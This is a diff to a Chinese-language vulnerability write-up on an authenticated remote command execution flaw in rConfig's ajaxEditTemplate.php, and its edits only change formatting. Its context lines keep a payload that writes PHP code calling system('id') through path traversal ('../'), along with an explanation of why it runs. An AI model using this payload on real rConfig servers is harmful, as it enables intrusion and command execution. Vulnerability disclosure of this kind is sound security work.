@@ -14,7 +14,7 @@ rConfig ajaxEditTemplate.php 存在后台远程命令执行
 
 ## 漏洞复现
 
-漏洞文件为 **rconfig/www/lib/ajaxHandlers/ajaxEditTemplate.php**
+漏洞文件为 `rconfig/www/lib/ajaxHandlers/ajaxEditTemplate.php`
 
 
 
@@ -167,7 +167,7 @@ fileName=../www/test.php&code=<?php echo system('id');?>&id=1
 
 
 
-这里写入文件 **test.php.yml**,并使用 **../** 跳出限制的目录，访问 test.php.yml 实际访问了 test.php，执行id命令
+这里写入文件 `test.php.yml`,并使用 `../` 跳出限制的目录，访问 test.php.yml 实际访问了 test.php，执行id命令
 
 
 
